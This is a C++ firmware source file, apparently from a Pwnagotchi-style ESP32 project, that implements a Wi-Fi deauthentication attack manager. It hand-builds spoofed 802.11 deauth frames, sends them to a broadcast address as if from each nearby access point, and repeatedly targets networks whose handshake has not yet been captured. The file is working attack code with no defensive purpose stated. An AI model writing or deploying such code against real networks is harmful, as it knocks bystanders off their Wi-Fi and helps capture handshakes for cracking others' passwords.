/*
 * SPDX-FileCopyrightText: 2026 StackChan-Gotchi
 * SPDX-License-Identifier: MIT
 */
#include "deauth_manager.h"
#include "network_db.h"
#include "wifi_scanner.h"
#include <esp_wifi.h>
#include <esp_log.h>
#include <hal/hal.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char* TAG = "deauth_manager";

namespace gotchi {

static const uint8_t DISASSOC_REASON = 0x03;

DeauthManager::DeauthManager() 
    : _taskHandle(nullptr), _active(false), _frameCount(0), _lastDeauth(0) {
}

void DeauthManager::sendDeauthFrame(const uint8_t* bssid, uint8_t reason) {
    uint8_t deauth[32] = {0};
    
    uint16_t fc = 0x00C0;
    memcpy(&deauth[0], &fc, 2);
    deauth[2] = 0x00; deauth[3] = 0x00;
    
    memset(&deauth[4], 0xFF, 6);
    memcpy(&deauth[10], bssid, 6);
    memcpy(&deauth[16], bssid, 6);
    
    deauth[22] = 0; deauth[23] = 0;
    deauth[24] = reason;
    deauth[25] = 0;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
}

void DeauthManager::deauthTask(void* param) {
    (void)param;
    auto& dm = getDeauthManager();
    
    ESP_LOGI(TAG, "Deauth task started");
    
    while (dm._active) {
        uint32_t now = GetHAL().millis();
        
        if (now - dm._lastDeauth > 3000) {
            dm._lastDeauth = now;
            
            auto& db = getNetworkDatabase();
            uint8_t currentChannel = getWifiScanner().getCurrentChannel();
            
            int sent = 0;
            for (const auto& net : db.getNetworks()) {
                if (!dm._active) break;
                if (net.hasCapture) continue;
                if (net.channel != currentChannel) continue;
                
                dm.sendDeauthFrame(net.bssid, DISASSOC_REASON);
                dm._frameCount++;
                sent++;
                
                vTaskDelay(pdMS_TO_TICKS(50));
                
                if (sent >= 5) break;
            }
            
            if (dm._frameCount % 30 == 0 && dm._frameCount > 0) {
                ESP_LOGI(TAG, "Deauth frames sent: %u", dm._frameCount);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    ESP_LOGI(TAG, "Deauth task stopped, sent %u frames", dm._frameCount);
    dm._active = false;
    vTaskDelete(NULL);
}

bool DeauthManager::start() {
    if (_active) return true;
    
    ESP_LOGI(TAG, "Starting deauth attack...");
    _active = true;
    _frameCount = 0;
    _lastDeauth = 0;
    
    xTaskCreate(deauthTask, "deauth_task", 2048, NULL, 3, &_taskHandle);
    return true;
}

void DeauthManager::stop() {
    if (!_active) return;
    
    _active = false;
    
    if (_taskHandle) {
        vTaskDelay(pdMS_TO_TICKS(100));
        _taskHandle = nullptr;
    }
    
    ESP_LOGI(TAG, "Deauth attack stopped");
}

void DeauthManager::update() {
}

static DeauthManager _deauthManager;

DeauthManager& getDeauthManager() {
    return _deauthManager;
}

}